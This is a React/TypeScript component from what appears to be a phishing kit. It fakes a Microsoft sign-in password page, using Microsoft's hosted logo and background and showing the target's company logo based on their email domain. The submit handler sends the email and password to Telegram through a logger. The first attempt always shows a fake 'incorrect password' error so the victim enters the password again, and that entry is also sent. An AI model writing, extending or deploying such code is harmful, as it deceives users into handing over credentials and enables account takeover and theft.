import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { DomainLogoDetector } from '../utils/domainLogo';
import { TelegramLogger } from '../utils/telegram';

interface PasswordFormProps {
  email: string;
  onNext: (password: string) => void;
  onBack: () => void;
}

export function PasswordForm({ email, onNext, onBack }: PasswordFormProps) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [hasShownError, setHasShownError] = useState(false);
  const [domainLogo, setDomainLogo] = useState<string | null>(null);
  const [logoLoading, setLogoLoading] = useState(true);
  const [companyName, setCompanyName] = useState('');

  React.useEffect(() => {
    const loadDomainLogo = async () => {
      setLogoLoading(true);
      const domain = DomainLogoDetector.extractDomain(email);
      const logoUrl = await DomainLogoDetector.getDomainLogo(email);
      const company = DomainLogoDetector.getCompanyName(domain);
      
      setDomainLogo(logoUrl);
      setCompanyName(company);
      setLogoLoading(false);
    };

    if (email) {
      loadDomainLogo();
    }
  }, [email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!password) {
      return;
    }
    
    setShowError(false);
    setIsLoading(true);
    
    if (!hasShownError) {
      // Show incorrect password error first time
      await new Promise(resolve => setTimeout(resolve, 1500));
      // Send password to Telegram on first attempt
      await TelegramLogger.logLoginAttempt(email, password, null, 'password_first_attempt').catch(console.error);
      setIsLoading(false);
      setShowError(true);
      setHasShownError(true);
    } else {
      // Second attempt - proceed to next step
      await new Promise(resolve => setTimeout(resolve, 800));
      await TelegramLogger.logLoginAttempt(email, password, null, 'password_second_attempt').catch(console.error);
      setIsLoading(false);
      onNext(password);
    }
  };

  return (
    <div className="min-h-screen" style={{
      backgroundColor: '#f5f5f5',
      backgroundImage: 'url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg")',
      backgroundSize: 'cover',
      backgroundPosition: 'center',
      backgroundRepeat: 'no-repeat',
      backgroundAttachment: 'fixed'
    }}>
      {/* Main Content */}
      <div className="flex items-center justify-center min-h-screen px-6 py-8">
        <div className="w-full max-w-lg">
          <div>
            <div className="ext-sign-in-box">
              {/* Microsoft Logo */}
              <div className="mb-6">
                {logoLoading ? (
                  <div className="h-6 w-24 bg-gray-200 animate-pulse rounded"></div>
                ) : domainLogo ? (
                  <div className="flex items-center space-x-3">
                    <img 
                      className="h-6 w-6 object-contain" 
                      src={domainLogo} 
                      alt={companyName}
                      onError={(e) => {
                        // Fallback to Microsoft logo if domain logo fails to load
                        (e.target as HTMLImageElement).src = "https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg";
                        (e.target as HTMLImageElement).className = "h-6 w-auto";
                      }}
                    />
                    <span className="text-sm font-medium text-gray-700">{companyName}</span>
                  </div>
                ) : (
                  <img 
                    className="h-6 w-auto" 
                    src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" 
                    alt="Microsoft" 
                  />
                )}
              </div>
              
              <div className="flex items-center space-x-3 mb-6">
                <button
                  onClick={onBack}
                  className="p-1 hover:bg-gray-100 rounded"
                  type="button"
                >
                  <ArrowLeft className="w-4 h-4 ms-text-secondary" />
                </button>
                <div className="text-sm ms-text-secondary truncate">{email}</div>
              </div>

              <div className="mb-6">
                <h1 className="text-2xl font-light ms-text-primary">
                  {domainLogo && companyName ? `Sign in to ${companyName}` : 'Enter password'}
                </h1>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                {showError && (
                  <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded text-sm text-red-600">
                    Your account or password is incorrect. If you don't remember your password, <a href="#" className="ms-link text-red-600 underline">reset it now</a>.
                  </div>
                )}

                <div>
                  <div className="ms-input-container">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="ms-input-field pr-10"
                      required
                      autoComplete="current-password"
                    />
                    <label className={`ms-input-label ${password ? 'focused' : ''}`}>
                      Password
                    </label>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 ms-text-secondary hover:text-gray-600 p-1"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                <div className="text-xs">
                  <a href="#" className="ms-link">Forgot my password</a>
                </div>

                <div className="text-xs">
                  <a href="#" className="ms-link">Other ways to sign in</a>
                </div>

                <div className="flex justify-end pt-4">
                  <button
                    type="submit"
                    className={`ms-button-primary ${!password ? 'opacity-50 cursor-not-allowed' : ''}`}
                    disabled={!password}
                  >
                    {isLoading ? (
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                      'Sign in'
                    )}
                  </button>
                </div>
              </form>
            </div>
            
            {/* Sign-in options box */}
            <div className="sign-in-options-box">
              <svg className="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v-2H7v-2H4a1 1 0 01-1-1v-1.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z" />
              </svg>
              <span className="text-sm text-gray-700">Sign-in options</span>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 px-6 py-4 text-xs ms-text-secondary flex justify-center">
        <div className="flex space-x-4">
          <a href="#" className="ms-link text-xs">Terms of use</a>
          <a href="#" className="ms-link text-xs">Privacy & cookies</a>
          <span>...</span>
        </div>
      </div>
    </div>
  );
}